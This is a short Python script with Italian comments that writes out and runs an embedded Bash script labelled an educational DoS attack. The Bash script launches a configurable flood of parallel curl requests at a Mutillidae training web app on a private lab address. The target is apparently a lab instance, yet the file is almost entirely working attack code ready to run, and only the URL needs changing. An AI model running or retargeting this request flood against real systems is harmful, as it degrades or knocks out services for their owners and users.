import subprocess
import tempfile
import os

# Il tuo script Bash memorizzato in una variabile (o letto da un file)
bash_script = """#!/bin/bash
TARGET="http://192.168.142.143/mutillidae"
REQUESTS=${1:-100}
DELAY=${2:-0.05}

echo "===== ATTACCO DoS DIDATTICO ====="
for i in $(seq 1 $REQUESTS); do
    curl -s "$TARGET" > /dev/null &
    echo -ne "[$i/$REQUESTS] richiesta inviata...\\r"
    sleep $DELAY
done
wait
echo -e "\\nSimulazione DoS completata."
"""

def execute_bash_script(script_content):
    # 1. Crea un file temporaneo
    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".sh") as temp_file:
        temp_file.write(script_content)
        temp_path = temp_file.name

    try:
        # 2. Rendi il file eseguibile
        os.chmod(temp_path, 0o755)
        
        # 3. ESECUZIONE CORRETTA: Forza l'uso di /bin/bash
        # Questo evita l'errore "SyntaxError" perché Python non proverà a leggerlo
        print(f"[*] Lancio dello script Bash in corso...")
        subprocess.run(["/bin/bash", temp_path], check=True)
        
    finally:
        # 4. Pulizia: rimuove il file temporaneo
        if os.path.exists(temp_path):
            os.remove(temp_path)

if __name__ == "__main__":
    execute_bash_script(bash_script)
